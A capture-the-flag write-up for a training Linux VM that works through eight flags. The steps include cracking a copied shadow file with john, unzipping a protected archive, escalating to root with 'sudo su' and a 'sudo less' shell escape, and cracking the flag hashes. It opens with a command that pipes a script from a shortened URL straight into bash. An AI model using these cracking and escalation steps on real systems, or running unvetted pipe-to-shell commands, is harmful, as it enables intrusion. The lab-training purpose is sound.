# Linux Scavenger Hunt

Run the following to download and setup the cft VM through Vagrant:

`curl -s -L https://tinyurl.com/y27qf7oj | bash`



----


## Flag 1

> Finding this flag is imperative to moving on quickly, as it contains the passwords from users before they were hacked. Luckily, it doesn't have a great hiding spot. 



``` bash
# quick search through the home directory for any files containing a flag
cd ~
grep -R flag *
```



`flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.` 

While we are here there is also a `.pass_list.txt` in the same directory file which will seems like it will come in handy later.



## Flag 2

> A famous hacker had created a user on the system a year ago. Find this user, crack his password and login to his account.

 

Starting with `/etc/shadow` we see the permissions are correctly set and we don't have any access to read this.  There must be a copy of this file somewhere so we can get the password hashes to try to crack.

``` bash
find . -type f -iname shadow
./Documents/my-files/shadow
```

Putting `john` to work:

``` bash
cd ~/Documents/my-files
john shadow --wordlist="/home/student/Desktop/.pass_list.txt"

Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (student)
trustno1         (mitnik)
2g 0:00:00:00 100% 4.347g/s 208.6p/s 417.3c/s 417.3C/s 123456..webcam1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```



`su` into the user `mitnik` with the password `trustno1`

`flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0`



## Flag 3

> Find a ‘log’ file _and_ a zip file related to the hacker's name.

In the `/var/log/` directory there is a mitnik.log file.  Lets get the unique IPs out of the list. 

``` bash
cd /var/log
grep -o "[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+" mitnik.log | sort | uniq | wc

   102     102    1471
```



Quick hacky search to find any zips

``` bash
cd /
find -iname *.zip -print 2>/dev/null
```

Jackpot -> `./home/mitnik/Documents/.secret.zip`

``` bash
cd /home/mitnik/Documents/
unzip .secret.zip

password-> 102
```

The `babbage` file in the zip contains a username and password.

``` bash
-----------------
babbage : freedom
-----------------
```



`su` in as that user and bingo:

`flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.`



## Flag 4

> Find a directory with a list of hackers. Look for a file that has `read` permissions for the owner, `no` permissions for groups and `executable` only for everyone else.

Running a quick search `find -perm 401 -print 2>/dev/null` gives us:

``` bash
./home/babbage/Documents/woz
./home/babbage/Documents/stallman
./home/babbage/Documents/gates
./home/babbage/Documents/gosling
```

If we take a look in the file `stallman` (it is the only one with a file size > 0) we find what could be their password

It is -> `su stallman` with the password `computer` gives us the flag.

`flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0`



## Flag 5

> This user is writing a bash script, except it isn't quite working yet. Find it, debug it and run it.

Most people would use the `Documents` directory to store some scripts. So does stallman.

``` bash
ll /home/stallman/Documents
```

gives us the file `flag.sh`

Fixing this up gives us the flag            

`flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00`

We also get out next user `sysadmin` / `passw0rd` 



## Flag 6 

> Inspect this user's custom aliases and run the suspicious one for the proper flag.

Running `alias` will give us a list of all the user's aliases. 

``` bash
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias flag='echo You found '\''flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1'\'''
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
```

`flag` will give us what we are looking for.



`flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1`



## Flag 7 

>  Find an exploit to gain a root shell. Login as the root user.

Doesn't quite seem like the exploit we are after but a simple `sudo su root` will get us through.  But hay,  if the sudo permissions are not setup correctly and allow us to sudo su we'll take it.

`flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0`



The exploit I guess we are after though is with less.

``` bash
# create a file or find an existing one
cd ~/
echo "hacking the thingz" > file.txt

# Open this file with sudo and less
sudo less file.txt

# When less is open type:
!#/bin/bash

# This will take us to a shell as the root user.
# from there we can just su into the root account to get the flag
su root
```





## Flag 8 

>  Gather each of the 7 flags into a file and format it as if each flag was a username and password.
>
>  Crack these passwords for the final flag.

Add all the past flags into a file:

``` bash
flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.
flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0
flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.
flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0
flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
```

and run `john` to get the passwords.  (Just using the default word lists)

`john flags`

This takes a long time (in the hours) to run against the default rockyou.txt file list but the first couple of password come back in under 2 mins:

``` bash
cyber            (flag_6)
challenge.       (flag_7)
```



This looks like the end of a meaningful sentence so creating our own word list might produce quicker results.

Sure enough this wordlist runs in under a second and gives us all the cracked passwords.

``` bash
cyber
challenge.
congratulation
completing
well
done
this
security
complete
Well
Congratulations
on
for
Completing
finishing
you
have
finished
passed
You
completed
Completed
```



The result 

``` bash
flag_1:Congratulations
flag_2:You
flag_3:have
flag_4:completed
flag_5:this
flag_6:cyber
flag_7:challenge.
```



_on reflection the .pass_list.txt file from Flag1 would have given us the results we are looking for quickly and in one go._ 

